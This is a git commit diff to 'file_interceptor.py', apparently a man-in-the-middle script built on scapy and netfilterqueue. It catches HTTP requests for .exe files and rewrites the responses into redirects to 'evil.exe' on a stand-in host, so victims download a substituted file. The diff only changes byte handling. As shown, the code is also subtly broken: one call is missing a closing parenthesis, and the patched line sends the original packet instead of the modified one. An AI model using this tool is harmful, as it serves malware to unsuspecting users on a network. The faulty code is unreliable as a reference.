06e28eebd854379ad032a3573cae09c23128c7be
senevren <77117171+senevren@users.noreply.github.com>
2021-10-11 20:59:02 -0500

    Update file_interceptor.py

--- file_interceptor.py
+++ file_interceptor.py
@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+
 import netfilterqueue
 import scapy.all as scapy
 
@@ -16,7 +17,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if ".exe" in str(scapy_packet[scapy.Raw].load):
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
@@ -25,7 +26,8 @@ def process_packet(packet):
                 print("[+] Replacing file")
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/evil.exe\n\n"
                 
-                packet.set_payload(str(modified_packet))
+                packet.set_payload(bytes(scapy_packet))
+                # set_payload() expects a bytes-object
         
     packet.accept()
 
